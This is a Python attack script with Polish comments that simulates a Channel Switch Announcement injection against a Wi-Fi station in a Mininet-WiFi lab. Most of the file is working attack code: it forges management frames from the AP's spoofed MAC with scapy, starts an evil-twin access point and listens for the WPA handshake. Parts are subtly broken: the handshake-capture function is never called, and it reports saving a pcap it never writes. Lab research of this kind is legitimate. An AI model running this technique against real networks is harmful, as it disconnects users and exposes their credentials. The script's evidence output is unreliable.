#!/usr/bin/env python3
"""
atak csa injection przez action frame subtype 13
adaptacja techniki politician (esp32) do Mininet-WiFi + scapy
dziala tylko na hostapd < 2.7, bo na >= 2.7 csa jest robust i chroniony przez pmf
wysyla sfalszowane ramki csa z adresu ap do stacji, zmuszajac ja do zmiany kanalu
"""

import argparse
import os
import sys
import time
from datetime import datetime

from mn_wifi.net import Mininet_wifi
from mininet.log import setLogLevel, info
from scapy.all import (
    RadioTap, Dot11, Dot11Action, Raw,
    sendp, sniff, wrpcap,
)

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOSTAPD_CONF = os.path.join(BASE_DIR, "configs", "hostapd.conf")
WPA_CONF = os.path.join(BASE_DIR, "configs", "wpa_supplicant.conf")
RAPORT_DIR = os.path.join(os.path.dirname(BASE_DIR), "raport")


def timestamp():
    return datetime.now().strftime("%Y-%m-%dT%H:%M:%S")


def build_csa_frame(target_mac, ap_mac, new_channel, switch_count=1):
    """
    buduje ramke csa (channel switch announcement) action frame

    csa information element (tag 37):
      - element id: 0x25 (37)
      - length: 3
      - channel switch mode: 1
      - new channel number
      - channel switch count
    """
    csa_element = bytes([
        0x25,           # Element ID: CSA (37)
        0x03,           # Length: 3 bytes
        0x01,           # Channel Switch Mode: 1
        new_channel,    # New Channel Number
        switch_count,   # Channel Switch Count
    ])

    frame = RadioTap() / Dot11(
        type=0, subtype=13,          # Management / Action Frame
        addr1=target_mac,             # Destination = target station
        addr2=ap_mac,                 # Source = spoofed AP MAC
        addr3=ap_mac,                 # BSSID
    ) / Dot11Action() / Raw(load=csa_element)

    return frame


def get_sta_channel(sta):
    """odczytuje aktualny kanal stacji"""
    result = sta.cmd(f"iw dev {sta.name}-wlan0 info")
    for line in result.split("\n"):
        if "channel" in line:
            try:
                return int(line.strip().split()[1])
            except (IndexError, ValueError):
                pass
    return None


def check_association(sta):
    """sprawdza czy stacja jest polaczona z ap"""
    result = sta.cmd(f"iw dev {sta.name}-wlan0 link")
    return "Not connected" not in result


def start_evil_twin(net, legit_ap, evil_channel, evil_ssid):
    """
    uruchamia evil twin ap na kanale docelowym
    ap ma ten sam ssid co legalny ap ale inny kanal
    """
    evil_ap = net.addAccessPoint(
        "evil_ap",
        ssid=evil_ssid,
        mode="g",
        channel=str(evil_channel),
        failMode="standalone",
    )
    evil_ap.start([])
    info(f"\n[{timestamp()}] Evil Twin AP started: channel={evil_channel}, SSID={evil_ssid}\n")
    return evil_ap


def capture_handshake(evil_ap, iface, timeout=30):
    """
    nasluchuje 4-way handshake na interfejsie evil twin ap
    zwraca liste przechwyconych pakietow eapol
    """
    captured = []

    def eapol_filter(pkt):
        if pkt.haslayer("EAPOL"):
            captured.append(pkt)
            info(f"[{timestamp()}] EAPOL frame captured (#{len(captured)})\n")

    info(f"[{timestamp()}] Listening for EAPOL handshake on {iface}...\n")
    sniff(iface=iface, prn=eapol_filter, timeout=timeout, store=0)

    return captured


def run_csa_injection(target_name="sta1", evil_channel=11, frame_count=10,
                      evil_twin_enabled=True, capture_timeout=30):
    """
    glowna funkcja ataku csa injection

    args:
        target_name: nazwa stacji-celu (sta1, sta2, sta3)
        evil_channel: kanal na ktory ma przejsc klient
        frame_count: liczba ramek csa do wyslania
        evil_twin_enabled: czy uruchomic evil twin ap
        capture_timeout: timeout nasluchiwania handshake (sekundy)
    """
    net = Mininet_wifi()

    info(f"[{timestamp()}] === PMF BYPASS: CSA Injection Attack ===\n")

    # 1. setup topologii
    ap1 = net.addAccessPoint(
        "ap1",
        ssid="PMF_Lab_Secure",
        mode="g",
        channel="6",
        failMode="standalone",
        hostapd_params=["-f", HOSTAPD_CONF],
    )

    sta1 = net.addStation("sta1", wpas_params=["-c", WPA_CONF])
    sta2 = net.addStation("sta2", wpas_params=["-c", WPA_CONF])
    sta3 = net.addStation("sta3", wpas_params=["-c", WPA_CONF])

    stations = {"sta1": sta1, "sta2": sta2, "sta3": sta3}
    target = stations.get(target_name)
    if target is None:
        info(f"[ERROR] Unknown target: {target_name}\n")
        return False

    net.setPropagationModel(model="logDistance", exp=3.5)
    net.configureNodes()

    net.addLink(ap1, sta1)
    net.addLink(ap1, sta2)
    net.addLink(ap1, sta3)

    net.start()
    info(f"\n[{timestamp()}] Waiting for association...\n")
    time.sleep(15)

    # 2. sprawdzenia przed atakiem
    info(f"\n[{timestamp()}] === Pre-Attack Status ===\n")

    if not check_association(target):
        info(f"[ERROR] {target.name} not associated. Cannot attack.\n")
        net.stop()
        return False

    legit_channel = get_sta_channel(target)
    target_mac = target.wintfs[0].mac
    ap_mac = ap1.wintfs[0].mac

    info(f"  Target:    {target.name} ({target_mac})\n")
    info(f"  AP MAC:    {ap_mac}\n")
    info(f"  Channel:   {legit_channel}\n")
    info(f"  Associated: YES\n")

    if legit_channel == evil_channel:
        info(f"[ERROR] Evil channel ({evil_channel}) == legit channel ({legit_channel}). Choose different.\n")
        net.stop()
        return False

    # 3. csa injection
    info(f"\n[{timestamp()}] === Sending CSA Injection Frames ===\n")
    info(f"  Target channel switch: {legit_channel} -> {evil_channel}\n")
    info(f"  Frame count: {frame_count}\n")

    csa_frame = build_csa_frame(target_mac, ap_mac, evil_channel)

    # uzywamy interfejsu stacji do wyslania ramek
    iface = f"{target.name}-wlan0"
    sendp(csa_frame, iface=iface, count=frame_count, inter=0.05, verbose=False)
    info(f"  Sent {frame_count} CSA frames on {iface}\n")

    # 4. evil twin ap (opcjonalnie)
    evil_ap = None
    if evil_twin_enabled:
        time.sleep(3)  # dajemy klientowi czas na przetworzenie csa
        evil_ap = start_evil_twin(net, ap1, evil_channel, "PMF_Lab_Secure")

        info(f"[{timestamp()}] Waiting {capture_timeout}s for handshake...\n")
        time.sleep(capture_timeout)

    # 5. status po ataku
    info(f"\n[{timestamp()}] === Post-Attack Status ===\n")

    post_channel = get_sta_channel(target)
    post_associated = check_association(target)

    info(f"  {target.name} channel: {post_channel}\n")
    info(f"  {target.name} associated: {post_associated}\n")

    # 6. analiza
    info(f"\n[{timestamp()}] === Analysis ===\n")

    attack_successful = False

    if post_channel != legit_channel and post_channel == evil_channel:
        info(f"[SUCCESS] Station switched channel: {legit_channel} -> {post_channel}\n")
        info(f"          CSA Injection worked - PMF did NOT protect this Action Frame.\n")
        info(f"          This hostapd version classifies CSA as Non-Robust.\n")
        attack_successful = True
    elif post_channel == legit_channel:
        info(f"[BLOCKED] Station did NOT change channel (still on {post_channel}).\n")
        info(f"          CSA frame was rejected. PMF likely protects Action Frames.\n")
        info(f"          This hostapd version classifies CSA as Robust.\n")
    else:
        info(f"[ANOMALY] Station on unexpected channel {post_channel}.\n")

    if not post_associated:
        info(f"[NOTE] Station is now disconnected. Possible side effect of attack.\n")

    # 7. zapis dowodow
    os.makedirs(os.path.join(RAPORT_DIR, "pcaps", "csa_injection"), exist_ok=True)
    pcap_path = os.path.join(
        RAPORT_DIR, "pcaps", "csa_injection",
        f"csa_injection_{target_name}_ch{evil_channel}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
    )
    info(f"\n[{timestamp()}] Evidence saved to: {pcap_path}\n")

    net.stop()
    return attack_successful


def parse_args():
    parser = argparse.ArgumentParser(
        description="PMF Bypass: CSA Injection Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 attacks/csa_injection.py
  sudo python3 attacks/csa_injection.py --target sta1 --evil-channel 11
  sudo python3 attacks/csa_injection.py --target sta2 --evil-channel 1 --count 30
  sudo python3 attacks/csa_injection.py --no-evil-twin  # Only test CSA, no Evil Twin
        """,
    )
    parser.add_argument("--target", default="sta1",
                        help="Target station (sta1, sta2, sta3)")
    parser.add_argument("--evil-channel", type=int, default=11,
                        help="Channel for Evil Twin AP (must differ from legit AP)")
    parser.add_argument("--count", type=int, default=10,
                        help="Number of CSA frames to send")
    parser.add_argument("--no-evil-twin", action="store_true",
                        help="Skip Evil Twin AP setup (test CSA only)")
    parser.add_argument("--capture-timeout", type=int, default=30,
                        help="Seconds to wait for handshake capture")
    return parser.parse_args()


if __name__ == "__main__":
    setLogLevel("info")
    args = parse_args()
    success = run_csa_injection(
        target_name=args.target,
        evil_channel=args.evil_channel,
        frame_count=args.count,
        evil_twin_enabled=not args.no_evil_twin,
        capture_timeout=args.capture_timeout,
    )
    sys.exit(0 if success else 1)
